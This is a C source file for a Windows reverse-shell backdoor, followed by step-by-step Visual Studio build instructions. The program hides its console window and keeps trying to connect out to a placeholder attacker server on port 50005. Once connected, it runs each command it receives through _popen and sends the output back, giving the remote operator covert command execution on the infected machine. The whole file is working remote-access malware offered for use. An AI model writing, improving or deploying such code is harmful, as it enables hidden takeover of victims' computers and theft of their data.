#define _WINSOCK_DEPRECATED_NO_WARNINGS
#pragma comment(lib, "Ws2_32.lib")
#include <stdio.h>
#include <stdlib.h>
//#include <unistd.h>
#include <winsock2.h>
#include <WS2tcpip.h>
#include <windows.h>
#include <winuser.h>
#include <wininet.h>
#include <windowsx.h>
#include <string.h>
#include <sys/stat.h>
#include <sys/types.h>



int sock;


#define putZero(p, size) (void) memset((p), 0, (size))


void Shell() {
    // returns nothing

    char buffer[1024];  // stores command
    char container[1024];
    char total_response[18384];

    // Conversation between server and client
    while (1) {
    jump:
        // zero out variables
        putZero(buffer, sizeof(buffer));
        putZero(container, sizeof(container));
        putZero(total_response, sizeof(total_response));

        // --receive command from server
        recv(sock, buffer, 1024, 0);

            // do action based off what command was recv'd in buffer
            if ((strncmp("q", buffer, 1)) == 0) {
                closesocket(sock);
                WSACleanup();
                exit(0);
            }
            else {
                FILE* fp;
                fp = _popen(buffer, "r"); // read buffer and execute (as a process) it; store it in fp

                // copying (first, second, third, etc.) 1024 bytes from fp to container, then adding container into total_response. This is repeated until entire response is inside total_response
                    while (fgets(container, 1024, fp) != NULL) {
                        strcat_s(total_response, sizeof(total_response), container);
                    }

                // --send the response to server
                send(sock, total_response, sizeof(total_response), 0);
                fclose(fp);

            }
    }

}

int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPev, LPSTR lpCmdLine, int nCmdShow) {

    // Hide the console window
    HWND stealth;
    AllocConsole(); // allocate new console to calling function
    stealth = FindWindowA("ConsoleWindowClass", NULL);  // gets handle to top level window
        ShowWindow(stealth, 0); // hides the window


        // Prepping socket items
    struct sockaddr_in ServerAddr;
    unsigned short ServerPort;
    char* ServerIP;
    WSADATA wsaData; // structure that contains info about Windows Socket (Windows to Windows)
    ServerIP = "<SERVER_IP>"; // REPLACE!!!
    ServerPort = 50005;

    // Kill program if conneciton is not possible
    if (WSAStartup(MAKEWORD(2, 0), &wsaData) != 0) {
        exit(1);
    }

    // Cont'd prepping socket items
    sock = socket(AF_INET, SOCK_STREAM, 0); // AF_INET: establishing connection over IPv4, SOCK_STREAM: TCP/3-way handshake
    memset(&ServerAddr, 0, sizeof(ServerAddr)); // zero out the content serverAddr (because it's structs)
    ServerAddr.sin_family = AF_INET;
    ServerAddr.sin_addr.s_addr = inet_addr(ServerIP);
    ServerAddr.sin_port = htons(ServerPort);

    // rewrite start logic...
start:
    // Perform connect function every 10 seconds until it is equal 0 (zero means connection was established)
    while (connect(sock, (struct sockaddr*)&ServerAddr, sizeof(ServerAddr)) != 0) {
        Sleep(10);
        goto start;
    }

    // recv commands from server, execute them, and then send the information back
    Shell();
}



/// Notes on how to run

// 1. Create Project within Visual Studio
// 2. Create .c file with Source Files
// 3. Copy/Paste file into .c file
// 4. Build -> Build <PROJECT-NAME> 
    // not the solution, although it still might work
// 5. Reset the Subsystem configuration to Linker->System->SubSystem should be Windows.
    // This will allow it to create .exe file and build successfully 
    // The alternative option for this is "Console". This allows you to run the .c file and have non-terminating console output the results of running the .c file
    // But... it will show errors for this file
// 6. Open command prompt and navigate to: c:\PATH\TO\source\repos\PROJECTNAME\Debug
// 7. Run .exe file (but have server.c running first). It will run and end quick. On your linux/server you will have a pseudo terminal